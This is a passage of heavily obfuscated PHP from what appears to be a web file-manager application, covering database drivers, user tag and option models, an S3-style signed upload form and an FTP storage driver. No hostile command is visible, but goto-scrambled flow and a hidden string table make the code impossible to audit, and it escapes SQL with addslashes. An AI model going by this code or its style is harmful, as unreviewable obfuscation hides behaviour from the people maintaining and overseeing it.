(isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[53]]) ? $d¬ÓÉ†¯Šô[$eñ›£¤÷[53]] : $eñ›£¤÷[384]), $eñ›£¤÷[36] => isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[103]]) ? strtolower($d¬ÓÉ†¯Šô[$eñ›£¤÷[103]]) == $eñ›£¤÷[38] : (isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[54]]) ? $d¬ÓÉ†¯Šô[$eñ›£¤÷[54]] : !1), $eñ›£¤÷[39] => isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[909]]) ? strtolower($d¬ÓÉ†¯Šô[$eñ›£¤÷[909]]) == $eñ›£¤÷[41] : (isset($d¬ÓÉ†¯Šô[$eñ›£¤÷[103]]) ? $d¬ÓÉ†¯Šô[$eñ›£¤÷[103]] : !1)); } } goto BíÛ™Ã­«; CòÂĞ©§: } public function getTables($CÜ—¾–ùá = '') { $EïàŠ©¹Á =& $_SERVER[Ü˜]; if (think_config($EïàŠ©¹Á[910])) { $FÒª™†è… = str_replace($EïàŠ©¹Á[911], $CÜ—¾–ùá, think_config($EïàŠ©¹Á[910])); } else { switch ($this->dbType) { case $EïàŠ©¹Á[878]: case $EïàŠ©¹Á[880]: $FÒª™†è… = $EïàŠ©¹Á[912]; break; case $EïàŠ©¹Á[877]: case $EïàŠ©¹Á[895]: $FÒª™†è… = $EïàŠ©¹Á[913]; break; case $EïàŠ©¹Á[904]: $FÒª™†è… = $EïàŠ©¹Á[914]; break; case $EïàŠ©¹Á[879]: think_exception(think_lang($EïàŠ©¹Á[915]) . $EïàŠ©¹Á[916]); break; case $EïàŠ©¹Á[896]: $FÒª™†è… = $EïàŠ©¹Á[42] . $EïàŠ©¹Á[43] . $EïàŠ©¹Á[44]; break; case $EïàŠ©¹Á[907]: default: if (!empty($CÜ—¾–ùá)) { $FÒª™†è… = $EïàŠ©¹Á[860] . $CÜ—¾–ùá . $EïàŠ©¹Á[861]; } else { $FÒª™†è… = $EïàŠ©¹Á[862]; } } } $DÕèí¦ˆ¼ = $this->query($FÒª™†è…); $fäÙáª¦ëÕ = array(); foreach ($DÕèí¦ˆ¼ as $fÕöµùÎõ => $a„õ³–Ã„å) { $fäÙáª¦ëÕ[$fÕöµùÎõ] = current($a„õ³–Ã„å); } return $fäÙáª¦ëÕ; } protected function parseLimit($fÀğÒ²¨¢ª) { $b¼ƒ½«Ğ×± =& $_SERVER[Ü˜]; $FÑí˜’® = $b¼ƒ½«Ğ×±[33]; if (!empty($fÀğÒ²¨¢ª)) { switch ($this->dbType) { case $b¼ƒ½«Ğ×±[904]: case $b¼ƒ½«Ğ×±[896]: $fÀğÒ²¨¢ª = explode($b¼ƒ½«Ğ×±[47], $fÀğÒ²¨¢ª); if (count($fÀğÒ²¨¢ª) > 1) { $FÑí˜’® .= $b¼ƒ½«Ğ×±[48] . $fÀğÒ²¨¢ª[1] . $b¼ƒ½«Ğ×±[49] . $fÀğÒ²¨¢ª[0] . $b¼ƒ½«Ğ×±[50]; } else { $FÑí˜’® .= $b¼ƒ½«Ğ×±[48] . $fÀğÒ²¨¢ª[0] . $b¼ƒ½«Ğ×±[50]; } break; case $b¼ƒ½«Ğ×±[877]: case $b¼ƒ½«Ğ×±[895]: break; case $b¼ƒ½«Ğ×±[879]: break; case $b¼ƒ½«Ğ×±[878]: case $b¼ƒ½«Ğ×±[880]: break; case $b¼ƒ½«Ğ×±[907]: default: $FÑí˜’® .= $b¼ƒ½«Ğ×±[48] . $fÀğÒ²¨¢ª . $b¼ƒ½«Ğ×±[50]; } } return $FÑí˜’®; } public function parseKey(&$FåÙŠ¬†ÅÍ, $a¬Õ“÷‹’© = true) { $d—ª®¬„è³ =& $_SERVER[Ü˜]; if ($a¬Õ“÷‹’©) { $FåÙŠ¬†ÅÍ = $this->parseKeyCheck($FåÙŠ¬†ÅÍ); } if ($this->dbType == $d—ª®¬„è³[907]) { if ($FåÙŠ¬†ÅÍ != $d—ª®¬„è³[192] && !preg_match($d—ª®¬„è³[872], $FåÙŠ¬†ÅÍ)) { $FåÙŠ¬†ÅÍ = $d—ª®¬„è³[391] . trim($FåÙŠ¬†ÅÍ, $d—ª®¬„è³[391]) . $d—ª®¬„è³[391]; } return $FåÙŠ¬†ÅÍ; } else { return parent::parseKey($FåÙŠ¬†ÅÍ, $a¬Õ“÷‹’©); } } public function close() { $this->_linkID = null; } public function error() { $a³Ûè©‹éº =& $_SERVER[Ü˜]; if ($this->PDOStatement) { $eË—½“„ = $this->PDOStatement->errorInfo(); $this->error = $eË—½“„[1] . $a³Ûè©‹éº[4] . $eË—½“„[2]; } else { $this->error = $a³Ûè©‹éº[33]; } if ($a³Ûè©‹éº[33] != $this->queryStr) { $this->error .= LNG($a³Ûè©‹éº[45]) . $this->queryStr; } think_trace($this->error, $a³Ûè©‹éº[33], $a³Ûè©‹éº[46]); return $this->error; } public function escapeString($D¨Ã¼‘ñÕğ) { $féùÀ¾‡» =& $_SERVER[Ü˜]; switch ($this->dbType) { case $féùÀ¾‡»[904]: case $féùÀ¾‡»[877]: case $féùÀ¾‡»[895]: case $féùÀ¾‡»[907]: return addslashes($D¨Ã¼‘ñÕğ); case $féùÀ¾‡»[879]: case $féùÀ¾‡»[896]: case $féùÀ¾‡»[878]: case $féùÀ¾‡»[880]: return str_ireplace($féùÀ¾‡»[55], $féùÀ¾‡»[56], $D¨Ã¼‘ñÕğ); } } protected function parseValue($e“ô°ŸØ Ü) { $FÑä¬«ÉŞ³ =& $_SERVER[Ü˜]; if (is_string($e“ô°ŸØ Ü)) { $b»¸Ì‘– = strpos($e“ô°ŸØ Ü, $FÑä¬«ÉŞ³[4]) === 0 && in_array($e“ô°ŸØ Ü, array_keys($this->bind)); $e“ô°ŸØ Ü = $b»¸Ì‘– ? $this->escapeString($e“ô°ŸØ Ü) : $FÑä¬«ÉŞ³[917] . $this->escapeString($e“ô°ŸØ Ü) . $FÑä¬«ÉŞ³[917]; } elseif (isset($e“ô°ŸØ Ü[0]) && is_string($e“ô°ŸØ Ü[0]) && strtolower($e“ô°ŸØ Ü[0]) == $FÑä¬«ÉŞ³[304]) { $e“ô°ŸØ Ü = $this->escapeString($e“ô°ŸØ Ü[1]); } elseif (is_array($e“ô°ŸØ Ü)) { $e“ô°ŸØ Ü = array_map(array($this, $FÑä¬«ÉŞ³[918]), $e“ô°ŸØ Ü); } elseif (is_bool($e“ô°ŸØ Ü)) { $e“ô°ŸØ Ü = $e“ô°ŸØ Ü ? $FÑä¬«ÉŞ³[97] : $FÑä¬«ÉŞ³[201]; } elseif (is_null($e“ô°ŸØ Ü)) { $e“ô°ŸØ Ü = $FÑä¬«ÉŞ³[113]; } return $e“ô°ŸØ Ü; } public function getLastInsertId() { $a“¸×‚ì =& $_SERVER[Ü˜]; switch ($this->dbType) { case $a“¸×‚ì[904]: case $a“¸×‚ì[896]: case $a“¸×‚ì[877]: case $a“¸×‚ì[895]: case $a“¸×‚ì[879]: case $a“¸×‚ì[907]: return $this->_linkID->lastInsertId(); case $a“¸×‚ì[878]: case $a“¸×‚ì[880]: $d™”†ù£¤â = $this->table; $a‹×Û—Ü÷Å = $this->query("\123\x45\114\105\x43\124\40{$d™”†ù£¤â}\56\x63\165\162\x72\166\141\x6c\x20\x63\x75\162\162\166\141\154\40\x46\x52\x4f\x4d\40\x64\x75\141\154"); return $a‹×Û—Ü÷Å ? $a‹×Û—Ü÷Å[0][$a“¸×‚ì[919]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($eÓÛØ¯Ñ½ ) { $EÎæäÊ± =& $_SERVER[Ü˜]; if (!CacheLock::fileLock($EÎæäÊ±[9])) { return !1; } $Açµ—“í£œ = parent::query($eÓÛØ¯Ñ½ ); CacheLock::fileUnLock($EÎæäÊ±[9]); return $Açµ—“í£œ; } public function execute($dÍ‹ áÙ×) { $A®ïñÓØˆ =& $_SERVER[Ü˜]; if (!CacheLock::fileLock($A®ïñÓØˆ[9])) { return !1; } $BîÏÏõßåè = parent::execute($dÍ‹ áÙ×); CacheLock::fileUnLock($A®ïñÓØˆ[9]); return $BîÏÏõßåè; } } class DbSqlite3 extends DbSqlite3Base { public function query($d†Œ÷³¬¿¡) { $F—â’ä¡ Ÿ =& $_SERVER[Ü˜]; if (!CacheLock::fileLock($F—â’ä¡ Ÿ[9])) { return !1; } $E¡ÓÛƒê† = parent::query($d†Œ÷³¬¿¡); CacheLock::fileUnLock($F—â’ä¡ Ÿ[9]); return $E¡ÓÛƒê†; } public function execute($DŸ Í´ÍÂ) { $cêØîñòù£ =& $_SERVER[Ü˜]; if (!CacheLock::fileLock($cêØîñòù£[9])) { return !1; } $EÔÕ¨ÑÌåó = parent::execute($DŸ Í´ÍÂ); CacheLock::fileUnLock($cêØîñòù£[9]); return $EÔÕ¨ÑÌåó; } } goto CÆÙƒËÅŞ; dÉ•®ÛÀ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Aõ‹½íò˜) { $E‰‚º˜Ì™ì =& $_SERVER[Ü˜]; if (!defined($E‰‚º˜Ì™ì[463])) { define($E‰‚º˜Ì™ì[463], 0); } return "\125\x73\x65\162\117\160\x74\151\x6f\x6e\137{$Aõ‹½íò˜}\137" . USER_ID; } protected function filterWhere($fĞİíÑ†) { $eÊĞ‚Ëº« =& $_SERVER[Ü˜]; if (!defined($eÊĞ‚Ëº«[463])) { define($eÊĞ‚Ëº«[463], 0); } $fĞİíÑ†[$eÊĞ‚Ëº«[1529]] = USER_ID; return $fĞİíÑ†; } public function cacheRemoveUser($bÃòÃÏÑ¾×, $Bä™ êÌ”†) { return Cache::remove("\x55\x73\145\162\117\160\x74\151\157\x6e\x5f{$bÃòÃÏÑ¾×}\x5f" . $Bä™ êÌ”†); } protected function optionDefault($aî¬Ş£ù‡ = '') { $Eœ×ÎŞ =& $_SERVER[Ü˜]; if ($aî¬Ş£ù‡ == $Eœ×ÎŞ[33]) { return $GLOBALS[$Eœ×ÎŞ[6]][$Eœ×ÎŞ[2163]]; } if ($aî¬Ş£ù‡ == $Eœ×ÎŞ[2164]) { return $GLOBALS[$Eœ×ÎŞ[6]][$Eœ×ÎŞ[2165]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\164\141\x67\x4c\x69\x73\x74"; public $modelType = "\125\x73\145\x72\x4f\x70\164\x69\x6f\x6e"; public $field = array("\156\141\155\145", "\x73\164\171\x6c\145", "\163\157\x72\x74"); public function listData($DÀ½Ö§µ³ = false, $a—øÛ•â = "\163\157\x72\x74", $Aİ¯ƒô£Ô = false) { return parent::listData($DÀ½Ö§µ³, $a—øÛ•â, $Aİ¯ƒô£Ô); } public function remove($CªğÚÉ¶§¸) { return parent::remove($CªğÚÉ¶§¸); } public function add($Cò‰çÓ¸“, $D§²«ÌÆ±å = "\154\141\142\x65\x6c\55\147\162\x65\171\55\156\x6f\x72\x6d\141\x6c") { $e÷âóø‰¡ƒ =& $_SERVER[Ü˜]; if ($this->findByName($Cò‰çÓ¸“)) { return !1; } $eÑ‡„êÌ›¶ = array($e÷âóø‰¡ƒ[422] => $Cò‰çÓ¸“, $e÷âóø‰¡ƒ[473] => $D§²«ÌÆ±å, $e÷âóø‰¡ƒ[1697] => $this->getSort($e÷âóø‰¡ƒ[265]) + 1); return parent::insert($eÑ‡„êÌ›¶); } public function update($e¥ˆßŒµÑÏ, $CªÁĞöÕ©¥) { $eò ‡›§Ğ =& $_SERVER[Ü˜]; $FËØ¹„¸ğ× = $this->listData($e¥ˆßŒµÑÏ); $eòò£¾˜Ÿù = $this->findByName($CªÁĞöÕ©¥[$eò ‡›§Ğ[28]]); if (!$FËØ¹„¸ğ× || $eòò£¾˜Ÿù && $eòò£¾˜Ÿù[$eò ‡›§Ğ[402]] != $FËØ¹„¸ğ×[$eò ‡›§Ğ[402]]) { return !1; } return parent::update($e¥ˆßŒµÑÏ, $CªÁĞöÕ©¥); } public function moveTop($E¬—›Ç·Ø‡) { $EÆö˜©çóÀ =& $_SERVER[Ü˜]; $aâ¹»å·  = parent::listData(); $fÇè½¢¢©¤ = $this->getSort($EÆö˜©çóÀ[264]); foreach ($aâ¹»å·  as &$E¸º½ÈÖ±à) { if ($E¸º½ÈÖ±à[$EÆö˜©çóÀ[402]] == $E¬—›Ç·Ø‡) { $E¸º½ÈÖ±à[$EÆö˜©çóÀ[1716]] = $fÇè½¢¢©¤; continue; } $E¸º½ÈÖ±à[$EÆö˜©çóÀ[1716]] += 1; } unset($E¸º½ÈÖ±à); return parent::resetData($aâ¹»å· ); } public function moveBottom($CÁ‚ÖÈ©ö) { $fãïêÅ³˜ò =& $_SERVER[Ü˜]; $f””É°İ– = $this->getSort($fãïêÅ³˜ò[265]) + 1; return parent::update($CÁ‚ÖÈ©ö, array($fãïêÅ³˜ò[1716] => $f””É°İ–)); } public function resetSort($E‰ÄÁ¤ƒ¬) { goto dœÃÂ°¤áˆ; bêì”‰†ä¶: unset($F‰¬½†È”Ÿ); return parent::resetData($a°Ã†ŒëÑÄ); goto EÀÊŞ†‚ÎÆ; D¿ìÑˆ§Óß: for ($fßÜ‘Á«¡ø = 0; $fßÜ‘Á«¡ø < count($E‰ÄÁ¤ƒ¬); $fßÜ‘Á«¡ø++) { $a–ÒÂ…‡ñœ[$E‰ÄÁ¤ƒ¬[$fßÜ‘Á«¡ø] . $f¤Ô°ç™—¯[33]] = $fßÜ‘Á«¡ø + 1; } $a°Ã†ŒëÑÄ = parent::listData(); foreach ($a°Ã†ŒëÑÄ as &$F‰¬½†È”Ÿ) { $fÚíË‘™¯¥ = $a–ÒÂ…‡ñœ[$F‰¬½†È”Ÿ[$f¤Ô°ç™—¯[402]]]; $F‰¬½†È”Ÿ[$f¤Ô°ç™—¯[1716]] = $fÚíË‘™¯¥ ? $fÚíË‘™¯¥ : $F‰¬½†È”Ÿ[$f¤Ô°ç™—¯[1716]]; } goto bêì”‰†ä¶; dœÃÂ°¤áˆ: $f¤Ô°ç™—¯ =& $_SERVER[Ü˜]; $a–ÒÂ…‡ñœ = array(); $E‰ÄÁ¤ƒ¬ = is_array($E‰ÄÁ¤ƒ¬) ? $E‰ÄÁ¤ƒ¬ : array(); goto D¿ìÑˆ§Óß; EÀÊŞ†‚ÎÆ: } private function getSort($Cé¡à“Éö) { $c±ÍªÆ¾½ß =& $_SERVER[Ü˜]; $díòÓ³ÜÌ¿ = parent::listData(); $d·Ş¹é¥’„ = array_to_keyvalue($díòÓ³ÜÌ¿, $c±ÍªÆ¾½ß[33], $c±ÍªÆ¾½ß[1716]); if (!$d·Ş¹é¥’„) { $d·Ş¹é¥’„ = array(0); } $b•Ã¢®µ = $Cé¡à“Éö == $c±ÍªÆ¾½ß[265] ? max($d·Ş¹é¥’„) : min($d·Ş¹é¥’„); return intval($b•Ã¢®µ); } } goto FË¹˜‡¸ÕÄ; e‹±êš ªÒ: class PathDriverEDS extends PathDriverMinIO { public function __construct($DâÂÓİ½²‡) { parent::__construct($DâÂÓİ½²‡); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($EÖÍ¼Î£å) { parent::__construct($EÖÍ¼Î£å); $this->signatureVersion($_SERVER[Ü˜][222]); } public function uploadFormData($cÌŞ¨Ç›¦ø, $e¶Ú˜ÛÖ¬ = 3600) { goto aš¨‚†âö÷; D¾–Úô¦ÒŠ: $b‘ÒÖùÊáÁ = $cóğ‹†Î‹Ø[1227]; $F‰óÁàâƒ³ = $e¶Ú˜ÛÖ¬ . $cóğ‹†Î‹Ø[33]; $EÕõº•Œ· = $cóğ‹†Î‹Ø[1190]; goto fÎ¨Ø„¯Á…; eùîà£Ì¦æ: $d®Ãîˆ‰ = array($cóğ‹†Î‹Ø[221] => $cóğ‹†Î‹Ø[33], $cóğ‹†Î‹Ø[1237] => $cóğ‹†Î‹Ø[33], $cóğ‹†Î‹Ø[1194] => $a§Íæ™Ó•Ø, $cóğ‹†Î‹Ø[1198] => $EÕõº•Œ·, $cóğ‹†Î‹Ø[1202] => $d¢¯ªç‚Œ, $cóğ‹†Î‹Ø[1238] => $AÕë±…ìÛ±, $cóğ‹†Î‹Ø[1239] => $eàé•Œ­º¦, $cóğ‹†Î‹Ø[1240] => $eÉÅ…ƒÖ, $cóğ‹†Î‹Ø[1241] => $F‰óÁàâƒ³, $cóğ‹†Î‹Ø[1242] => $E‘Öøá¾Ä‘, $cóğ‹†Î‹Ø[185] => $this->getHost()); return $d®Ãîˆ‰; goto d¾§ë±íå¯; aˆ‡™Ã¶ó: $f’‘áÃ¿ÕŸ = hash_hmac($cóğ‹†Î‹Ø[1235], $D³ºÓêŠÎ÷, $bøö‹÷ÀŸŸ, !0); $aÊØªµªÀá = hash_hmac($cóğ‹†Î‹Ø[1235], $b‘ÒÖùÊáÁ, $f’‘áÃ¿ÕŸ, !0); $E‘Öøá¾Ä‘ = hash_hmac($cóğ‹†Î‹Ø[1235], $d¢¯ªç‚Œ, $aÊØªµªÀá); goto eùîà£Ì¦æ; aš¨‚†âö÷: $cóğ‹†Î‹Ø =& $_SERVER[Ü˜]; $a§Íæ™Ó•Ø = $cóğ‹†Î‹Ø[202]; $eàé•Œ­º¦ = $cóğ‹†Î‹Ø[1225]; goto f¢Ë‘öìµ—; f¢Ë‘öìµ—: $D³ºÓêŠÎ÷ = $cóğ‹†Î‹Ø[69]; $eÉÅ…ƒÖ = gmdate($cóğ‹†Î‹Ø[1226]); $d–„‹ò†²Ä = gmdate($cóğ‹†Î‹Ø[720]); goto D¾–Úô¦ÒŠ; aË¬Ÿ¼×ó: $d¢¯ªç‚Œ = base64_encode(json_encode($eˆ’ÖÛØÙÊ)); $fğ¦İ–‘Æ = hash_hmac($cóğ‹†Î‹Ø[1235], $d–„‹ò†²Ä, $cóğ‹†Î‹Ø[1236] . $this->secret, !0); $bøö‹÷ÀŸŸ = hash_hmac($cóğ‹†Î‹Ø[1235], $this->region, $fğ¦İ–‘Æ, !0); goto aˆ‡™Ã¶ó; fÎ¨Ø„¯Á…: $Dğ±Êãš‘ = array($this->accessKey, $d–„‹ò†²Ä, $this->region, $D³ºÓêŠÎ÷, $b‘ÒÖùÊáÁ); $AÕë±…ìÛ± = implode($cóğ‹†Î‹Ø[8], $Dğ±Êãš‘); $eˆ’ÖÛØÙÊ = array($cóğ‹†Î‹Ø[1192] => gmdate($cóğ‹†Î‹Ø[1191], strtotime($cóğ‹†Î‹Ø[1228])), $cóğ‹†Î‹Ø[1193] => array(array($cóğ‹†Î‹Ø[1195] => $this->bucket), array($cóğ‹†Î‹Ø[1194] => $a§Íæ™Ó•Ø), array($cóğ‹†Î‹Ø[1196], $cóğ‹†Î‹Ø[1197], $cóğ‹†Î‹Ø[33]), array($cóğ‹†Î‹Ø[1196], $cóğ‹†Î‹Ø[1229], $cóğ‹†Î‹Ø[33]), array($cóğ‹†Î‹Ø[1196], $cóğ‹†Î‹Ø[1230], $cóğ‹†Î‹Ø[33]), array($cóğ‹†Î‹Ø[1198] => $EÕõº•Œ·), array($cóğ‹†Î‹Ø[1231] => $AÕë±…ìÛ±), array($cóğ‹†Î‹Ø[1232] => $eàé•Œ­º¦), array($cóğ‹†Î‹Ø[1233] => $eÉÅ…ƒÖ), array($cóğ‹†Î‹Ø[1234] => $F‰óÁàâƒ³))); goto aË¬Ÿ¼×ó; d¾§ë±íå¯: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($c•Ê˜©ÁÁÍ) { parent::__construct(); if (count($c•Ê˜©ÁÁÍ) > 0) { $this->_init($c•Ê˜©ÁÁÍ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($a“˜˜Ç…î) { $F·ÒÖ¬íğÏ =& $_SERVER[Ü˜]; global $config; $this->appCharset = $config[$F·ÒÖ¬íğÏ[1243]]; $this->systemCharset = $config[$F·ÒÖ¬íğÏ[1244]]; if (isset($a“˜˜Ç…î[$F·ÒÖ¬íğÏ[1245]]) && $a“˜˜Ç…î[$F·ÒÖ¬íğÏ[1245]]) { $this->systemCharset = $a“˜˜Ç…î[$F·ÒÖ¬íğÏ[1245]]; } } public function iconvApp($d¡²Ô¸Ÿçù) { return $this->iconvTo($d¡²Ô¸Ÿçù, $this->systemCharset, $this->appCharset); } public function iconvSystem($a°±îØ³‘Ç) { return $this->iconvTo($a°±îØ³‘Ç, $this->appCharset, $this->systemCharset); } public function getPathOuter($Aˆ®ßÕå÷) { goto bÎ©è—îÚí; f†ÂˆƒˆÊ: if (substr($e£¥«ˆ×¸Ë, 0, 2) == $b¢›æéÓòò[1246]) { $e£¥«ˆ×¸Ë = BASIC_PATH . substr($e£¥«ˆ×¸Ë, 2); } if (substr($Aˆ®ßÕå÷, 0, 2) == $b¢›æéÓòò[1246]) { $Aˆ®ßÕå÷ = BASIC_PATH . substr($Aˆ®ßÕå÷, 2); } $e£¥«ˆ×¸Ë = KodIO::clear($e£¥«ˆ×¸Ë); goto aà²¼°ƒ©·; B£™õ’³Ğè: return $this->pathDriver . $b¢›æéÓòò[8] . ltrim($Aˆ®ßÕå÷, $b¢›æéÓòò[8]); goto c‚¸Ô•ÄƒÛ; bÎ©è—îÚí: $b¢›æéÓòò =& $_SERVER[Ü˜]; $e£¥«ˆ×¸Ë = $this->iconvApp($this->pathBase); $Aˆ®ßÕå÷ = $this->iconvApp($Aˆ®ßÕå÷); goto f†ÂˆƒˆÊ; aà²¼°ƒ©·: $Aˆ®ßÕå÷ = KodIO::clear($Aˆ®ßÕå÷); $Aˆ®ßÕå÷ = substr($Aˆ®ßÕå÷, strlen($e£¥«ˆ×¸Ë)); if (empty($this->pathDriver)) { return $Aˆ®ßÕå÷; } goto B£™õ’³Ğè; c‚¸Ô•ÄƒÛ: } private function _init($A×‹—“ô— = array()) { $bâÍâ™Í¤ª =& $_SERVER[Ü˜]; if (!function_exists($bâÍâ™Í¤ª[1247])) { throw new Exception(LNG($bâÍâ™Í¤ª[1248])); } $this->config = $A×‹—“ô—; $this->charsetReset($A×‹—“ô—); foreach ($A×‹—“ô— as $Dæ—Úêø¸Ò => $Cè¢’¤Ë£¦) { if (isset($this->{$Dæ—Úêø¸Ò})) { $this->{$Dæ—Úêø¸Ò} = $Cè¢’¤Ë£¦; } } return $this->_login($A×‹—“ô—); } private function _login($BŞ‡»“ğ‡) { goto dËŒ­êß­™; AºĞó£×Í¬: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $b Îò¼½±Ë = $this->pasv == $DÛ«ÓŞ–”™[97] ? !0 : !1; @ftp_pasv($this->connect, $b Îò¼½±Ë); goto céï¸âØ¾Ú; CØ•‡İÀÓ: $B±éòôã†Å = isset($eæ»„Øƒé·[$DÛ«ÓŞ–”™[184]]) && $eæ»„Øƒé·[$DÛ«ÓŞ–”™[184]] == $DÛ«ÓŞ–”™[1249] ? !0 : !1; $this->scheme = $B±éòôã†Å ? $DÛ«ÓŞ–”™[1250] : $DÛ«ÓŞ–”™[1251]; $this->port = isset($eæ»„Øƒé·[$DÛ«ÓŞ–”™[186]]) ? $eæ»„Øƒé·[$DÛ«ÓŞ–”™[186]] : 21; goto Eïåô‰§ó¥; dæèÇÔİÕ: if (isset($CÏªëÕ¿˜‡[$cˆÙ¨…»Ö­])) { foreach ($CÏªëÕ¿˜‡[$cˆÙ¨…»Ö­] as $cÏ‘¡—ìÌ´ => $f•£½¿•‚) { $this->{$cÏ‘¡—ìÌ´} = $f•£½¿•‚; } return !0; } $eæ»„Øƒé· = parse_url(trim($this->server, $DÛ«ÓŞ–”™[8])); $this->host = $eæ»„Øƒé·[$DÛ«ÓŞ–”™[185]]; goto CØ•‡İÀÓ; céï¸âØ¾Ú: $CÏªëÕ¿˜‡[$cˆÙ¨…»Ö­] = array($DÛ«ÓŞ–”™[1252] => $this->connect, $DÛ«ÓŞ–”™[185] => $this->host, $DÛ«ÓŞ–”™[184] => $this->scheme, $DÛ«ÓŞ–”™[186] => $this->port); return $b°‡ÖÑŒ±; goto FÓ«¥Ë¬‚Ø; dËŒ­êß­™: $DÛ«ÓŞ–”™ =& $_SERVER[Ü˜]; static $CÏªëÕ¿˜‡ = array(); $cˆÙ¨…»Ö­ = md5(json_encode($BŞ‡»“ğ‡)); goto dæèÇÔİÕ; Eïåô‰§ó¥: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $b°‡ÖÑŒ± = @ftp_login($this->connect, $this->username, $this->userpass); goto AºĞó£×Í¬; FÓ«¥Ë¬‚Ø: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($EËÅ©ŠË, $fî–£Œ¦æ = '', $FÜ„ÑŒ««˜ = REPEAT_RENAME) { if ($this->setContent($EËÅ©ŠË, $fî–£Œ¦æ)) { return $this->getPathOuter($EËÅ©ŠË); } return !1; } public function mkdir($a¡ŠÕàé¡›, $dÅ«ã¢‘¦ó = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $a¡ŠÕàé¡› = $this->iconvSystem($a¡ŠÕàé¡›); if ($this->_isFolder($a¡ŠÕàé¡›) || @ftp_mkdir($this->connect, $a¡ŠÕàé¡›)) { return $this->getPathOuter($a¡ŠÕàé¡›); } if (!$this->mkdir($this->pathFather($a¡ŠÕàé¡›))) { return !1; } if ($a¡ŠÕàé¡› = @ftp_mkdir($this->connect, $a¡ŠÕàé¡›)) { return $this->getPathOuter($a¡ŠÕàé¡›); } return !1; } public function copyFile($aİê¯êœœ¸, $E‹›èĞ‚) { goto a‘ãš”ğ; f‰–Â‘á‡: $this->tempFileRemve($aà™Ú¨ÂŸÁ); return $FÊÍ…öîÑ’; goto A‚Àë¾äŠ; aÂº„˜ì»: $DéÆˆÅ¶¼š = $this->iconvApp($aà™Ú¨ÂŸÁ); $this->download($aİê¯êœœ¸, $DéÆˆÅ¶¼š); $FÊÍ…öîÑ’ = $this->upload($E‹›èĞ‚, $DéÆˆÅ¶¼š); goto f‰–Â‘á‡; a‘ãš”ğ: if (!$this->_isconn()) { return !1; } $e„¡¨¹±Çˆ = $this->pathThis($this->iconvSystem($aİê¯êœœ¸)); $aà™Ú¨ÂŸÁ = $this->tempFile($e„¡¨¹±Çˆ); goto aÂº„˜ì»; A‚Àë¾äŠ: } public function moveFile($D™áŞŒ©öÒ, $eèÇÀ÷Û¥Ñ) { if (!$this->_isconn()) { return !1; } $D™áŞŒ©öÒ = $this->iconvSystem($D™áŞŒ©öÒ); $eèÇÀ÷Û¥Ñ = $this->iconvSystem($eèÇÀ÷Û¥Ñ); $BŸ¨†ñ§» = @ftp_rename($this->connect, $D™áŞŒ©öÒ, $eèÇÀ÷Û¥Ñ); return $BŸ¨†ñ§» ? $this->getPathOuter($eèÇÀ÷Û¥Ñ) : !1; } public function delFile($aŸØÙìÌ£ö) { if (!$this->_isconn()) { return !1; } $aŸØÙìÌ£ö = $this->iconvSystem($aŸØÙìÌ£ö); return @ftp_delete($this->connect, $aŸØÙìÌ£ö); } public function delFolder($DéµßÁ´Ñ) { goto fâÁİ¶»É; fŒ…îÅ©: foreach ($BÀ›Ú÷ì«Ä as $CæÕ¼À†Å) { $CæÕ¼À†Å = $this->iconvSystem($CæÕ¼À†Å); $DÃ…¹©¬„Ç = @ftp_rmdir($this->connect, $CæÕ¼À†Å); if (!$DÃ…¹©¬„Ç) { return !1; } } $DéµßÁ´Ñ = $this->iconvSystem($DéµßÁ´Ñ); return @ftp_rmdir($this->connect, $DéµßÁ´Ñ); goto e‘¼×°÷ã¸; fâÁİ¶»É: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $BÀ›Ú÷ì«Ä = $A‘¨È¤¨ÃÈ = array(); goto C”ë¢½ªó¢; C”ë¢½ªó¢: $this->fileList($DéµßÁ´Ñ, $BÀ›Ú÷ì«Ä, $A‘¨È¤¨ÃÈ, !0); $this->listItemCache = !0; foreach ($A‘¨È¤¨ÃÈ as $b‘¹…³Ã‡š) { $CæÕ¼À†Å = $this->iconvSystem($b‘¹…³Ã‡š[$_SERVER[Ü˜][28]]); $DÃ…¹©¬„Ç = @ftp_delete($this->connect, $CæÕ¼À†Å); if (!$DÃ…¹©¬„Ç) { return !1; } } goto fŒ…îÅ©; e‘¼×°÷ã¸: } public function rename($e”‰¼‡£´î, $bÜ¥×–’®‚) { goto f¹ƒ‰¥’‰¿; B‡À°ÊÈ—”: $bÏ«®Œì© = rtrim($bø—Ÿ®¥Õš, $a°˜ÔŠ¢ËÅ[8]) . $a°˜ÔŠ¢ËÅ[8] . $c›ŸáŠÊµ»; $A¢ÇØ³İ†º = @ftp_rename($this->connect, $e”‰¼‡£´î, $bÏ«®Œì©); $bÏ«®Œì© = $this->iconvApp($bÏ«®Œì©); goto F§ÈËÛãŒƒ; fß¥­’ÁªŠ: $c›ŸáŠÊµ» = $this->iconvSystem($c›ŸáŠÊµ»); $e”‰¼‡£´î = $this->iconvSystem($e”‰¼‡£´î); $bø—Ÿ®¥Õš = $this->pathFather($e”‰¼‡£´î); goto B‡À°ÊÈ—”; f¹ƒ‰¥’‰¿: $a°˜ÔŠ¢ËÅ =& $_SERVER[Ü˜]; if (!$this->_isconn()) { return !1; } $c›ŸáŠÊµ» = $this->fileNameAuto($this->pathFather($e”‰¼‡£´î), $bÜ¥×–’®‚); goto fß¥­’ÁªŠ; F§ÈËÛãŒƒ: return $A¢ÇØ³İ†º ? $this->getPathOuter($bÏ«®Œì©) : !1; goto BºŠÛ¡ß§; 